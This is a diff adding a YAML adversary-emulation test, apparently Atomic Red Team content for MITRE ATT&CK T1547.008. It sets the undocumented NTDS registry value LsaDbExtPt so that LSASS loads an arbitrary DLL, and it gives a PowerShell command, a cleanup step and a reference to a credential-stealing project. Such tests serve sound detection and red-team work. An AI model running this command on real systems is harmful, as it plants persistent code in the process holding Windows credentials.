@@ -1,0 +1,23 @@
+- description: "The following Atomic will modify an undocumented registry key that\
+    \ may be abused to load a arbitrary DLL into LSASS. \n\nUpon execution, the registry\
+    \ key will be modified and a value will contain the path to the DLL. \nReference:\
+    \ https://blog.xpnsec.com/exploring-mimikatz-part-1/ and source https://github.com/oxfemale/LogonCredentialsSteal\n\
+    Note that if any LSA based protection is enabled, this will most likely not be\
+    \ successful with LSASS.exe loading the DLL.\n"
+  id: 4572792b-7173-c41d-22a8-27610b8f8890
+  name: Modify Registry to load Arbitrary DLL into LSASS - LsaDbExtPt
+  platforms:
+    windows:
+      psh:
+        cleanup: Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS"
+          -Name "LsaDbExtPt" -ErrorAction Ignore | Out-Null
+        command: New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS
+          -Name LsaDbExtPt -Value "PathToAtomicsFolder\..\ExternalPayloads\lsass_lib.dll"
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: multiple
+  technique:
+    attack_id: T1547.008
+    name: 'Boot or Logon Autostart Execution: LSASS Driver'
